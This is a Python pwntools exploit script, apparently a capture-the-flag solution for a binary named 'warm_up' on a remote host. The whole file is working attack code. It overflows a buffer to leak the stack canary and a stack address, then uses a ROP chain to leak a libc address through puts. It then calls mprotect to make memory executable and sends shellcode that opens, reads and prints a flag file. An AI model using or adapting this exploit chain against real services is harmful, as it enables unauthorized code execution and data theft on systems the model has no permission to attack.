from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
elf = ELF("./warm_up")
#p =  process("./warm_up")
p = remote("139.129.76.65", 50007)
libc = ELF("./libc-2.23.so")
def dbg():
    gdb.attach(p, 'b* 0x601200')
    #p.interactive()
read_addr = 0x400b03
pop_rdi_ret = 0x400bc3
pop_rbp_ret = 0x400970

p.recvuntil("!!!\n")
p.sendline('a'*0x18)
p.recv(0x19)
canary = u64('\x00' + p.recv(7))
rbp = u64(p.recv(6)+'\x00'*2)-0x10
success(hex(canary))
success(hex(rbp))
p.recvuntil("?")
payload = 'a'*0x18+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(pop_rbp_ret)+p64(rbp)+p64(read_addr)
p.sendline(payload)
libc_base = u64(p.recv(6)+'\x00'*2) - 0x6f690
system = libc_base + 0x45390
binsh = libc_base + 0x18cd57
pop_rsi_ret = libc_base + 0x202e8
pop_rdx_ret = libc_base + 0x1b92
read = libc_base + libc.sym['read']
mprotect = libc_base + libc.sym['mprotect']
bss = 0x601000
#read_ret_addr = rbp+8
payload = 'a'*0x18+p64(canary)
payload += p64(pop_rdi_ret) + p64(bss)
payload += p64(pop_rsi_ret)+ p64(0x2000)
payload += p64(pop_rdx_ret) + p64(7)
payload += p64(pop_rdi_ret) + p64(bss)
payload += p64(pop_rsi_ret)+ p64(0x2000)
payload += p64(pop_rdx_ret) + p64(7)
payload += p64(mprotect) 
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_ret) + p64(bss+0x200)
payload += p64(pop_rdx_ret) + p64(0x100)
payload += p64(read) + p64(bss+0x200) 
p.sendline(payload)
shellcode  = shellcraft.amd64.open("./flag")
shellcode += shellcraft.amd64.read(3,bss+0x300,0x30)
shellcode += shellcraft.amd64.write(1,bss+0x300,0x30)
sleep(0.1)
p.sendline(asm(shellcode))
p.interactive()